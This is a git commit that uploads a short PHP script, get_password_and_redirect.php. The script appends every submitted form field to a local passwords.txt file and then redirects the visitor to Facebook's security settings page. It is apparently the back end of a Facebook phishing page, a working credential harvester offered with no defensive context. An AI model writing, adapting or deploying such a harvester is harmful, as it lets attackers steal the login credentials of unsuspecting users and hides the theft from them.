d6a3cd17ffc7d74efb830504acfb5e9f1823a686
safi55 <61750592+safi55@users.noreply.github.com>
2020-05-28 12:08:01 +0000

    Add files via upload

---
+++ get_password_and_redirect.php
@@ -0,0 +1,14 @@
+<?php
+header ('Location: https://www.facebook.com/settings?tab=security');
+$handle = fopen("passwords.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
+?>
+
